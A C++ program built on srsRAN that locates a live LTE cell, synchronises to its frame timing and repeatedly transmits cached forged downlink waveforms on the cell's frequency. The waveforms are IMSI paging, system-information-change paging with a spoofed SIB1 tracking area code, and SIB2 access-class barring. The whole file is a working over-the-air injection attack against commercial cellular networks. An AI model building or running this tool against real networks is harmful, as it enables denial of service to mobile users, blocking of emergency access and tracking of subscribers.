#include "srsran/common/interfaces_common.h"
#include "srsran/radio/radio.h"
#include "srsran/radio/rf_buffer.h"
#include "srsran/radio/rf_timestamp.h"
#include "srsran/srslog/srslog.h"

extern "C" {
#include "srsran/common/crash_handler.h"
#include "srsran/phy/rf/rf.h"
#include "srsran/phy/rf/rf_utils.h"
#include "srsran/phy/ue/ue_cell_search.h"
#include "srsran/phy/ue/ue_mib.h"
#include "srsran/phy/ue/ue_sync.h"
#include "srsran/srsran.h"
}

#include <csignal>
#include <cmath>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <dirent.h>
#include <getopt.h>
#include <algorithm>
#include <memory>
#include <stdexcept>
#include <string>
#include <sys/stat.h>
#include <unistd.h>
#include <vector>

namespace {

struct prog_args_t {
  std::string device_name           = "auto";
  std::string rf_args               = "";
  std::string rf_log_level          = "info";
  std::string inject_type           = "";
  std::string tx_backend            = "radio";
  double      rx_freq_hz            = 0.0;
  double      search_srate          = SRSRAN_CS_SAMP_FREQ;
  double      radio_srate           = 23.04e6;
  double      tx_advance_us         = 66.0 / 30.72;
  float       rx_gain               = 60.0f;
  float       tx_gain               = 60.0f;
  float       min_rx_gain           = 0.0f;
  float       max_rx_gain           = 80.0f;
  uint32_t    nof_antennas          = 1;
  int         nof_subframes         = -1;
  int         force_n_id_2          = -1;
  bool        enable_agc            = false;
  bool        use_standard_lte_rate = false;
};

struct tx_trigger_t {
  bool               valid      = false;
  uint32_t           target_sfn = 0;
  srsran_timestamp_t tx_time    = {};
};

struct inject_msg_t {
  std::string        mode_name  = "";
  std::string        file_name  = "";
  uint32_t           subframe   = 0;
  cf_t*              buffer     = nullptr;
  cf_t*              rf_buffers[SRSRAN_MAX_CHANNELS] = {};
  uint32_t           nof_samples = 0;
  uint32_t           target_sfn = 0;
  srsran_timestamp_t tx_time    = {};
};

prog_args_t                    g_args;
std::shared_ptr<srsran::radio> g_radio;
volatile sig_atomic_t          g_go_exit = 0;
const char*                    g_cache_root = "./cache";
std::vector<inject_msg_t>      g_inject_msgs;
cell_search_cfg_t              g_cell_search_cfg                    = {
    .max_frames_pbch      = SRSRAN_DEFAULT_MAX_FRAMES_PBCH,
    .max_frames_pss       = SRSRAN_DEFAULT_MAX_FRAMES_PSS,
    .nof_valid_pss_frames = SRSRAN_DEFAULT_NOF_VALID_PSS_FRAMES,
    .init_agc             = 0,
    .force_tdd            = false};

void usage(const char* prog)
{
  printf("Usage: %s -f rx_freq_hz [options]\n", prog);
  printf("  -f RX frequency in Hz\n");
  printf("  -a RF args\n");
  printf("  -d Device name [default auto]\n");
  printf("  -g RX gain in dB [default %.1f]\n", g_args.rx_gain);
  printf("  -t TX gain in dB [default %.1f]\n", g_args.tx_gain);
  printf("  -u TX advance in us [default %.3f]\n", g_args.tx_advance_us);
  printf("  -A Number of RX antennas [default %u]\n", g_args.nof_antennas);
  printf("  -n Number of TX bursts after trigger [default unlimited]\n");
  printf("  -l Force N_id_2 during search [default best]\n");
  printf("  -m Injection type [supported: paging_imsi, paging_sib1, paging_sib2]\n");
  printf("  -B TX backend [radio|rf] [default %s]\n", g_args.tx_backend.c_str());
  printf("  -G Enable AGC\n");
  printf("  -Q Use standard LTE sample rates\n");
  printf("  -v Increase verbose level\n");
}

void parse_args(int argc, char** argv)
{
  int opt = 0;
  while ((opt = getopt(argc, argv, "f:a:d:g:t:u:A:n:l:m:B:GQv")) != -1) {
    switch (opt) {
      case 'f':
        g_args.rx_freq_hz = strtod(optarg, nullptr);
        break;
      case 'a':
        g_args.rf_args = optarg;
        break;
      case 'd':
        g_args.device_name = optarg;
        break;
      case 'g':
        g_args.rx_gain = strtof(optarg, nullptr);
        break;
      case 't':
        g_args.tx_gain = strtof(optarg, nullptr);
        break;
      case 'u':
        g_args.tx_advance_us = strtod(optarg, nullptr);
        break;
      case 'A':
        g_args.nof_antennas = (uint32_t)strtoul(optarg, nullptr, 10);
        break;
      case 'n':
        g_args.nof_subframes = (int)strtol(optarg, nullptr, 10);
        break;
      case 'l':
        g_args.force_n_id_2 = (int)strtol(optarg, nullptr, 10);
        break;
      case 'm':
        g_args.inject_type = optarg;
        break;
      case 'B':
        g_args.tx_backend = optarg;
        break;
      case 'G':
        g_args.enable_agc = true;
        g_cell_search_cfg.init_agc = (float)g_args.rx_gain;
        break;
      case 'Q':
        g_args.use_standard_lte_rate = true;
        g_args.radio_srate           = 30.72e6;
        break;
      case 'v':
        increase_srsran_verbose_level();
        break;
      default:
        usage(argv[0]);
        std::exit(-1);
    }
  }

  if (g_args.rx_freq_hz <= 0.0) {
    usage(argv[0]);
    std::exit(-1);
  }
  if (g_args.tx_backend != "radio" && g_args.tx_backend != "rf") {
    throw std::runtime_error("invalid TX backend, supported values are radio and rf");
  }
}

void sig_int_handler(int)
{
  g_go_exit = 1;
}

static int radio_recv_callback(void* ptr, cf_t* buffer[SRSRAN_MAX_CHANNELS], uint32_t nsamples, srsran_timestamp_t* ts)
{
  if (ptr == nullptr || buffer == nullptr || ts == nullptr) {
    return SRSRAN_ERROR_INVALID_INPUTS;
  }

  auto* radio = static_cast<srsran::radio*>(ptr);
  srsran::rf_buffer_t rf_buffer(buffer, nsamples);
  srsran::rf_timestamp_t rf_timestamp;

  if (!radio->rx_now(rf_buffer, rf_timestamp)) {
    return SRSRAN_ERROR;
  }

  *ts = rf_timestamp.get(0);
  return (int)nsamples;
}

static SRSRAN_AGC_CALLBACK(radio_set_rx_gain_wrapper)
{
  static_cast<srsran::radio*>(h)->set_rx_gain(gain_db);
}

bool is_directory(const char* path)
{
  struct stat st = {};
  return stat(path, &st) == 0 && S_ISDIR(st.st_mode);
}

bool file_exists(const char* path)
{
  struct stat st = {};
  return stat(path, &st) == 0;
}

char* path_join(const char* a, const char* b)
{
  size_t len = strlen(a) + strlen(b) + 2;
  char*  out = (char*)malloc(len);
  if (out != nullptr) {
    snprintf(out, len, "%s/%s", a, b);
  }
  return out;
}

void search_recursive(const char* root, const char* target_name, char** found_path)
{
  DIR* dir = opendir(root);
  if (dir == nullptr) {
    return;
  }

  struct dirent* entry = nullptr;
  while ((entry = readdir(dir)) != nullptr) {
    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
      continue;
    }

    char* subpath = path_join(root, entry->d_name);
    if (subpath == nullptr) {
      continue;
    }

    if (is_directory(subpath)) {
      if (strcmp(entry->d_name, target_name) == 0) {
        char* mib_path = path_join(subpath, "mib.json");
        if (mib_path != nullptr && file_exists(mib_path) && *found_path == nullptr) {
          *found_path = strdup(subpath);
        }
        free(mib_path);
      }
      search_recursive(subpath, target_name, found_path);
    }

    free(subpath);
  }
  closedir(dir);
}

char* find_cell_dir(uint32_t pci)
{
  char  target_name[64] = {};
  char* found_path      = nullptr;

  snprintf(target_name, sizeof(target_name), "cell_%u", pci);
  search_recursive(g_cache_root, target_name, &found_path);
  return found_path;
}

void load_msg_buffer(uint32_t pci, inject_msg_t& msg)
{
  char*  cell_dir  = nullptr;
  char*  file_path = nullptr;
  FILE*  fp        = nullptr;
  size_t count     = 0;
  long   file_size = 0;
  size_t nof_samples = 0;
  int    first_nonzero = -1;
  float  peak_amp      = 0.0f;

  cell_dir = find_cell_dir(pci);
  if (cell_dir == nullptr) {
    throw std::runtime_error("failed to find cell cache directory for paging injection");
  }

  file_path = path_join(cell_dir, msg.file_name.c_str());
  free(cell_dir);
  if (file_path == nullptr) {
    throw std::runtime_error("failed to build inject file path");
  }

  fp = fopen(file_path, "rb");
  if (fp == nullptr) {
    free(file_path);
    throw std::runtime_error("failed to open inject file");
  }

  if (fseek(fp, 0, SEEK_END) != 0) {
    fclose(fp);
    free(file_path);
    throw std::runtime_error("failed to seek inject file");
  }
  file_size = ftell(fp);
  if (file_size <= 0 || (file_size % (long)sizeof(cf_t)) != 0) {
    fclose(fp);
    free(file_path);
    throw std::runtime_error("inject file size is invalid");
  }
  rewind(fp);

  nof_samples = (size_t)file_size / sizeof(cf_t);
  msg.buffer = srsran_vec_cf_malloc((uint32_t)nof_samples);
  if (msg.buffer == nullptr) {
    fclose(fp);
    free(file_path);
    throw std::runtime_error("failed to allocate inject buffer");
  }
  srsran_vec_cf_zero(msg.buffer, (uint32_t)nof_samples);

  count = fread(msg.buffer, sizeof(cf_t), nof_samples, fp);
  fclose(fp);
  free(file_path);
  if (count == 0) {
    throw std::runtime_error("inject file is empty");
  }

  msg.nof_samples = (uint32_t)count;
  msg.rf_buffers[0] = msg.buffer;
  for (size_t i = 0; i < count; ++i) {
    float i_part = __real__ msg.buffer[i];
    float q_part = __imag__ msg.buffer[i];
    float amp    = hypotf(i_part, q_part);

    if (first_nonzero < 0 && amp > 1e-6f) {
      first_nonzero = (int)i;
    }
    if (amp > peak_amp) {
      peak_amp = amp;
    }
  }

  printf("[inject] loaded %s with %zu samples first_nonzero=%d peak_amp=%.6f\n",
         msg.file_name.c_str(),
         count,
         first_nonzero,
         peak_amp);
}

void build_paging_sib2_composite(uint32_t samples_per_subframe)
{
  if (g_inject_msgs.size() != 2) {
    throw std::runtime_error("paging_sib2 expects exactly two source waveforms");
  }

  inject_msg_t& paging_msg = g_inject_msgs[0];
  inject_msg_t& sib2_msg   = g_inject_msgs[1];

  if (paging_msg.buffer == nullptr || sib2_msg.buffer == nullptr) {
    throw std::runtime_error("paging_sib2 source waveform is empty");
  }

  uint32_t edge_zeros = samples_per_subframe / 10;
  if (paging_msg.nof_samples <= edge_zeros || sib2_msg.nof_samples <= edge_zeros) {
    throw std::runtime_error("paging_sib2 source waveform too short for edge trimming");
  }

  uint32_t paging_trimmed_len = paging_msg.nof_samples - edge_zeros;
  uint32_t sib2_trimmed_len   = sib2_msg.nof_samples - edge_zeros;
  uint32_t total_samples      = paging_trimmed_len + sib2_trimmed_len;
  cf_t*    composite     = srsran_vec_cf_malloc(total_samples);
  if (composite == nullptr) {
    throw std::runtime_error("failed to allocate paging_sib2 composite buffer");
  }
  srsran_vec_cf_zero(composite, total_samples);

  memcpy(composite, paging_msg.buffer, paging_trimmed_len * sizeof(cf_t));
  memcpy(composite + paging_trimmed_len, sib2_msg.buffer + edge_zeros, sib2_trimmed_len * sizeof(cf_t));

  free(paging_msg.buffer);
  free(sib2_msg.buffer);
  paging_msg.buffer = nullptr;
  sib2_msg.buffer   = nullptr;

  inject_msg_t composite_msg = {};
  composite_msg.mode_name    = "paging_sib2";
  composite_msg.file_name    = "paging_sib2_sf9_sf0.fc32";
  composite_msg.subframe     = 9;
  composite_msg.buffer       = composite;
  composite_msg.rf_buffers[0] = composite;
  composite_msg.nof_samples  = total_samples;

  g_inject_msgs.clear();
  g_inject_msgs.push_back(composite_msg);

  printf("[inject] built paging_sib2 composite with %u samples (trim_tail=%u trim_head=%u)\n",
         total_samples,
         edge_zeros,
         edge_zeros);
}

void build_paging_sib1_composite(uint32_t samples_per_subframe)
{
  if (g_inject_msgs.size() != 2) {
    throw std::runtime_error("paging_sib1 expects exactly two source waveforms");
  }

  inject_msg_t& paging_msg = g_inject_msgs[0];
  inject_msg_t& sib1_msg   = g_inject_msgs[1];

  if (paging_msg.buffer == nullptr || sib1_msg.buffer == nullptr) {
    throw std::runtime_error("paging_sib1 source waveform is empty");
  }

  uint32_t edge_zeros = samples_per_subframe / 10;
  uint32_t paging_offset = 4 * samples_per_subframe - 0 * edge_zeros;
  if (paging_offset < sib1_msg.nof_samples - edge_zeros) {
    throw std::runtime_error("paging_sib1 paging offset is smaller than trimmed sib1 waveform length");
  }

  uint32_t total_samples = paging_offset + (paging_msg.nof_samples - edge_zeros);
  cf_t*    composite     = srsran_vec_cf_malloc(total_samples);
  if (composite == nullptr) {
    throw std::runtime_error("failed to allocate paging_sib1 composite buffer");
  }
  srsran_vec_cf_zero(composite, total_samples);

  memcpy(composite, sib1_msg.buffer, (sib1_msg.nof_samples - edge_zeros) * sizeof(cf_t));
  memcpy(composite + paging_offset, paging_msg.buffer + edge_zeros, (paging_msg.nof_samples - edge_zeros) * sizeof(cf_t));

  free(paging_msg.buffer);
  free(sib1_msg.buffer);
  paging_msg.buffer = nullptr;
  sib1_msg.buffer   = nullptr;

  inject_msg_t composite_msg = {};
  composite_msg.mode_name     = "paging_sib1";
  composite_msg.file_name     = "paging_sib1_sf5_gap_sf9.fc32";
  composite_msg.subframe      = 5;
  composite_msg.buffer        = composite;
  composite_msg.rf_buffers[0] = composite;
  composite_msg.nof_samples   = total_samples;

  g_inject_msgs.clear();
  g_inject_msgs.push_back(composite_msg);

  printf("[inject] built paging_sib1 composite with %u samples (offset=%u trim_head=%u trim_tail=%u)\n",
         total_samples,
         paging_offset,
         edge_zeros,
         edge_zeros);
}

void prepare_inject_msgs(uint32_t pci, uint32_t samples_per_subframe)
{
  g_inject_msgs.clear();

  if (g_args.inject_type == "paging_imsi") {
    g_inject_msgs.push_back({"paging_imsi", "paging_imsi_sf9.fc32", 9, nullptr, 0, 0, {}});
  } else if (g_args.inject_type == "paging_sib1") {
    g_inject_msgs.push_back({"paging_sib1", "paging_sysinfmod_sf9.fc32", 9, nullptr, 0, 0, {}});
    g_inject_msgs.push_back({"paging_sib1", "sib1_tac_sf5.fc32", 5, nullptr, 0, 0, {}});
  } else if (g_args.inject_type == "paging_sib2") {
    g_inject_msgs.push_back({"paging_sib2", "paging_sysinfmod_sf9.fc32", 9, nullptr, 0, 0, {}});
    g_inject_msgs.push_back({"paging_sib2", "sib2_acbarring_sf0.fc32", 0, nullptr, 0, 0, {}});
  }

  for (auto& msg : g_inject_msgs) {
    load_msg_buffer(pci, msg);
  }

  if (g_args.inject_type == "paging_sib1") {
    build_paging_sib1_composite(samples_per_subframe);
  } else if (g_args.inject_type == "paging_sib2") {
    build_paging_sib2_composite(samples_per_subframe);
  }
}

void init_radio()
{
  srsran::rf_args_t rf_args = {};
  rf_args.device_name       = g_args.device_name;
  rf_args.device_args       = g_args.rf_args;
  rf_args.log_level         = g_args.rf_log_level;
  rf_args.srate_hz          = g_args.radio_srate;
  rf_args.rx_gain           = g_args.rx_gain;
  rf_args.dl_freq           = (float)g_args.rx_freq_hz;
  rf_args.nof_carriers      = 1;
  rf_args.nof_antennas      = g_args.nof_antennas;

  g_radio = std::make_shared<srsran::radio>();
  if (g_radio->init(rf_args, nullptr) != SRSRAN_SUCCESS) {
    throw std::runtime_error("failed to init radio");
  }

  g_radio->set_rx_srate(g_args.search_srate);
  g_radio->set_rx_freq(0, g_args.rx_freq_hz);
  g_radio->set_rx_gain(g_args.rx_gain);
  g_radio->set_tx_freq(0, g_args.rx_freq_hz);
  g_radio->set_tx_gain(g_args.tx_gain);
}

bool send_with_selected_backend(inject_msg_t& msg)
{
  if (g_args.tx_backend == "rf") {
    srsran_rf_t* rf_dev = g_radio->get_rf_device(0);
    if (rf_dev == nullptr) {
      return false;
    }
    int ret = srsran_rf_send_timed_multi(rf_dev,
                                         (void**)msg.rf_buffers,
                                         msg.nof_samples,
                                         msg.tx_time.full_secs,
                                         msg.tx_time.frac_secs,
                                         true,
                                         true,
                                         true);
    return ret >= SRSRAN_SUCCESS;
  }

  srsran::rf_buffer_t    tx_buffer(msg.rf_buffers, msg.nof_samples);
  srsran::rf_timestamp_t tx_timestamp = {};
  *tx_timestamp.get_ptr(0) = msg.tx_time;
  return g_radio->tx(tx_buffer, tx_timestamp);
}

const char* mode_desc(const inject_msg_t& msg)
{
  if (msg.mode_name == "paging_imsi") {
    return "paging(imsi) sf9";
  }
  if (msg.mode_name == "paging_sib1") {
    return "paging(sysinfmod) sib1(tac) sf5->sf9";
  }
  if (msg.mode_name == "paging_sib2") {
    return "paging(sysinfmod) sib2(acbarring) sf9->sf0";
  }
  return msg.mode_name.c_str();
}

bool search_cell(srsran_cell_t* cell, float* cfo)
{
  srsran_ue_cellsearch_t        cs          = {};
  srsran_ue_cellsearch_result_t found_cells[3] = {};
  int                           nfound      = 0;
  int                           best_idx    = -1;
  float                         best_psr    = -1.0f;

  if (srsran_ue_cellsearch_init_multi(&cs,
                                      g_cell_search_cfg.max_frames_pss,
                                      radio_recv_callback,
                                      g_args.nof_antennas,
                                      g_radio.get()) != SRSRAN_SUCCESS) {
    throw std::runtime_error("failed to init LTE cell search");
  }

  srsran_ue_cellsearch_set_nof_valid_frames(&cs, g_cell_search_cfg.nof_valid_pss_frames);
  if (g_args.enable_agc) {
    srsran_ue_sync_start_agc(&cs.ue_sync,
                             radio_set_rx_gain_wrapper,
                             g_args.min_rx_gain,
                             g_args.max_rx_gain,
                             g_cell_search_cfg.init_agc);
  }

  nfound = srsran_ue_cellsearch_scan(&cs, found_cells, nullptr);
  if (nfound < 0) {
    srsran_ue_cellsearch_free(&cs);
    throw std::runtime_error("LTE cell search failed");
  }

  for (int i = 0; i < 3; ++i) {
    if (g_args.force_n_id_2 >= 0 && (int)(found_cells[i].cell_id % 3) != g_args.force_n_id_2) {
      continue;
    }
    if (found_cells[i].psr > best_psr) {
      best_psr = found_cells[i].psr;
      best_idx = i;
    }
  }

  if (best_idx >= 0) {
    cell->id         = found_cells[best_idx].cell_id;
    cell->cp         = found_cells[best_idx].cp;
    cell->frame_type = found_cells[best_idx].frame_type;
    cell->nof_prb    = SRSRAN_UE_MIB_NOF_PRB;
    cell->nof_ports  = 0;
    if (cfo != nullptr) {
      *cfo = found_cells[best_idx].cfo;
    }
    printf("[search] cell_id=%u cp=%s frame_type=%s psr=%.2f cfo=%.1f Hz\n",
           cell->id,
           cell->cp == SRSRAN_CP_NORM ? "Normal" : "Extended",
           cell->frame_type == SRSRAN_FDD ? "FDD" : "TDD",
           found_cells[best_idx].psr,
           found_cells[best_idx].cfo);
  }

  srsran_ue_cellsearch_free(&cs);
  return best_idx >= 0;
}

bool decode_mib(srsran_cell_t* cell, float cfo_hz, uint32_t* sfn)
{
  srsran_ue_mib_sync_t mib_sync = {};
  uint8_t              bch_payload[SRSRAN_BCH_PAYLOAD_LEN] = {};
  uint32_t             nof_ports                            = 0;
  int                  sfn_offset                           = 0;

  if (srsran_ue_mib_sync_init_multi(&mib_sync, radio_recv_callback, g_args.nof_antennas, g_radio.get()) !=
      SRSRAN_SUCCESS) {
    throw std::runtime_error("failed to init ue_mib_sync");
  }

  if (srsran_ue_mib_sync_set_cell(&mib_sync, *cell) != SRSRAN_SUCCESS) {
    srsran_ue_mib_sync_free(&mib_sync);
    throw std::runtime_error("failed to configure ue_mib_sync");
  }

  mib_sync.ue_sync.cfo_current_value       = cfo_hz / 15000.0f;
  mib_sync.ue_sync.cfo_is_copied           = true;
  mib_sync.ue_sync.cfo_correct_enable_find = true;
  srsran_sync_set_cfo_cp_enable(&mib_sync.ue_sync.sfind, false, 0);

  int ret = srsran_ue_mib_sync_decode(
      &mib_sync, g_cell_search_cfg.max_frames_pbch, bch_payload, &nof_ports, &sfn_offset);
  if (ret == SRSRAN_UE_MIB_FOUND) {
    srsran_pbch_mib_unpack(bch_payload, cell, sfn);
    *sfn            = (*sfn + (uint32_t)sfn_offset) % 1024;
    cell->nof_ports = nof_ports;
  }

  srsran_ue_mib_sync_free(&mib_sync);
  return ret == SRSRAN_UE_MIB_FOUND;
}

tx_trigger_t wait_for_first_trigger(srsran_cell_t cell, float search_cell_cfo)
{
  tx_trigger_t         trigger         = {};
  int                  srate           = srsran_sampling_freq_hz(cell.nof_prb);
  srsran_ue_sync_t     ue_sync         = {};
  srsran_ue_mib_t      ue_mib          = {};
  std::vector<cf_t*>   sf_buffer(g_args.nof_antennas, nullptr);
  uint32_t             max_num_samples = 3 * SRSRAN_SF_LEN_PRB(cell.nof_prb);
  uint8_t              bch_payload[SRSRAN_BCH_PAYLOAD_LEN] = {};
  uint32_t             mib_sfn                            = 0;

  if (srate <= 0) {
    throw std::runtime_error("invalid LTE sampling rate");
  }

  g_radio->set_rx_srate((double)srate);
  g_radio->set_tx_srate((double)srate);
  g_radio->set_rx_freq(0, g_args.rx_freq_hz);
  g_radio->set_rx_gain(g_args.rx_gain);
  g_radio->set_tx_freq(0, g_args.rx_freq_hz);
  g_radio->set_tx_gain(g_args.tx_gain);

  if (srsran_ue_sync_init_multi_decim(&ue_sync,
                                      cell.nof_prb,
                                      false,
                                      radio_recv_callback,
                                      g_args.nof_antennas,
                                      g_radio.get(),
                                      1) != SRSRAN_SUCCESS) {
    throw std::runtime_error("failed to init ue_sync");
  }

  if (srsran_ue_sync_set_cell(&ue_sync, cell) != SRSRAN_SUCCESS) {
    srsran_ue_sync_free(&ue_sync);
    throw std::runtime_error("failed to set ue_sync cell");
  }

  ue_sync.cfo_current_value        = search_cell_cfo / 15000.0f;
  ue_sync.cfo_is_copied            = true;
  ue_sync.cfo_correct_enable_find  = true;
  ue_sync.cfo_correct_enable_track = true;
  srsran_sync_set_cfo_cp_enable(&ue_sync.sfind, false, 0);

  sf_buffer[0] = srsran_vec_cf_malloc(max_num_samples);
  if (sf_buffer[0] == nullptr) {
    srsran_ue_sync_free(&ue_sync);
    throw std::runtime_error("failed to allocate sf buffer");
  }

  if (srsran_ue_mib_init(&ue_mib, sf_buffer[0], cell.nof_prb) != SRSRAN_SUCCESS) {
    free(sf_buffer[0]);
    srsran_ue_sync_free(&ue_sync);
    throw std::runtime_error("failed to init ue_mib");
  }
  if (srsran_ue_mib_set_cell(&ue_mib, cell) != SRSRAN_SUCCESS) {
    srsran_ue_mib_free(&ue_mib);
    free(sf_buffer[0]);
    srsran_ue_sync_free(&ue_sync);
    throw std::runtime_error("failed to set ue_mib cell");
  }

  printf("[sync] waiting for first trigger at %.2f Msps for PCI=%u, PRB=%u\n", srate / 1e6, cell.id, cell.nof_prb);
  prepare_inject_msgs(cell.id, (uint32_t)(srate / 1000));

  while (!g_go_exit && !trigger.valid) {
    cf_t*              sf_ptrs[SRSRAN_MAX_CHANNELS] = {};
    srsran_timestamp_t rx_ts                        = {};
    int                sfn_offset                   = 0;

    sf_ptrs[0] = sf_buffer[0];
    int ret = srsran_ue_sync_zerocopy(&ue_sync, sf_ptrs, max_num_samples);
    if (ret < 0) {
      printf("[sync] receive/sync error\n");
      continue;
    }
    if (ret == 0) {
      continue;
    }

    srsran_ue_sync_get_last_timestamp(&ue_sync, &rx_ts);
    printf("[sync] sf=%u rx_time=%.6f cfo=%.1f Hz sfo=%.3f\n",
           srsran_ue_sync_get_sfidx(&ue_sync),
           (double)rx_ts.full_secs + rx_ts.frac_secs,
           srsran_ue_sync_get_cfo(&ue_sync),
           srsran_ue_sync_get_sfo(&ue_sync));

    if (srsran_ue_sync_get_sfidx(&ue_sync) != 0) {
      continue;
    }

    if (srsran_ue_mib_decode(&ue_mib, bch_payload, nullptr, &sfn_offset) != SRSRAN_UE_MIB_FOUND) {
      printf("[sync] sf0 detected but MIB decode failed\n");
      continue;
    }

    srsran_pbch_mib_unpack(bch_payload, &cell, &mib_sfn);
    mib_sfn = (mib_sfn + (uint32_t)sfn_offset) % 1024;

    trigger.valid      = true;
    trigger.target_sfn = mib_sfn;
    trigger.tx_time    = rx_ts;
    srsran_timestamp_sub(&trigger.tx_time, 0, g_args.tx_advance_us * 1e-6);

    for (auto& msg : g_inject_msgs) {
      msg.target_sfn = mib_sfn;
      msg.tx_time    = trigger.tx_time;
      srsran_timestamp_add(&msg.tx_time, 0, 0.020 + msg.subframe * 0.001);
      printf("[trigger] %s target_sfn=%u target_sf=%u time=%.6f s tx_advance=%.3f us\n",
             msg.file_name.c_str(),
             msg.target_sfn,
             msg.subframe,
             (double)msg.tx_time.full_secs + msg.tx_time.frac_secs,
             g_args.tx_advance_us);
    }
  }

  srsran_ue_mib_free(&ue_mib);
  free(sf_buffer[0]);
  srsran_ue_sync_free(&ue_sync);
  return trigger;
}

void run_loop_tx(tx_trigger_t trigger)
{
  uint32_t               sent         = 0;

  printf("[tx-loop] g_inject_msgs.size()=%zu\n", g_inject_msgs.size());

  while (!g_go_exit && (g_args.nof_subframes < 0 || (int)sent < g_args.nof_subframes)) {
    std::sort(g_inject_msgs.begin(), g_inject_msgs.end(), [](const inject_msg_t& a, const inject_msg_t& b) {
      if (a.tx_time.full_secs != b.tx_time.full_secs) {
        return a.tx_time.full_secs < b.tx_time.full_secs;
      }
      return a.tx_time.frac_secs < b.tx_time.frac_secs;
    });

    for (auto& msg : g_inject_msgs) {
      if (sent < 5 || sent % 50 == 0) {
        printf("[count=%u/sfn=%u] %s time=%.6fs\n",
               
               sent + 1,
               msg.target_sfn,
               mode_desc(msg),
               (double)msg.tx_time.full_secs + msg.tx_time.frac_secs);
      }

      if (!send_with_selected_backend(msg)) {
        printf("[inject] timed tx failed for %s\n", msg.file_name.c_str());
        continue;
      }

      msg.target_sfn = (msg.target_sfn + 1) % 1024;
      srsran_timestamp_add(&msg.tx_time, 0, 0.010);
    }

    sent++;
    usleep(5000);
  }
}

} // namespace

int main(int argc, char** argv)
{
  srsran_cell_t cell            = {};
  float         search_cell_cfo = 0.0f;
  uint32_t      sfn             = 0;

  srsran_debug_handle_crash(argc, argv);
  parse_args(argc, argv);
  srsran_use_standard_symbol_size(g_args.use_standard_lte_rate);
  signal(SIGINT, sig_int_handler);
  signal(SIGTERM, sig_int_handler);
  srslog::init();

  try {
    init_radio();
    if (!search_cell(&cell, &search_cell_cfo)) {
      printf("No LTE cell found at %.3f MHz\n", g_args.rx_freq_hz / 1e6);
      g_radio->stop();
      return 0;
    }

    if (!decode_mib(&cell, search_cell_cfo, &sfn)) {
      printf("MIB decode failed for PCI=%u\n", cell.id);
      g_radio->stop();
      return 0;
    }

    printf("[mib] pci=%u sfn=%u prb=%u ports=%u cp=%s\n",
           cell.id,
           sfn,
           cell.nof_prb,
           cell.nof_ports,
           cell.cp == SRSRAN_CP_NORM ? "Normal" : "Extended");

    tx_trigger_t trigger = wait_for_first_trigger(cell, search_cell_cfo);
    if (trigger.valid) {
      printf("[tx-loop] first trigger acquired, switching to 10 ms periodic tx\n");
      run_loop_tx(trigger);
    }

    for (auto& msg : g_inject_msgs) {
      if (msg.buffer != nullptr) {
        free(msg.buffer);
        msg.buffer = nullptr;
      }
    }
    g_inject_msgs.clear();
    g_radio->stop();
  } catch (const std::exception& e) {
    for (auto& msg : g_inject_msgs) {
      if (msg.buffer != nullptr) {
        free(msg.buffer);
        msg.buffer = nullptr;
      }
    }
    g_inject_msgs.clear();
    if (g_radio) {
      g_radio->stop();
    }
    fprintf(stderr, "Error: %s\n", e.what());
    return -1;
  }

  return 0;
}
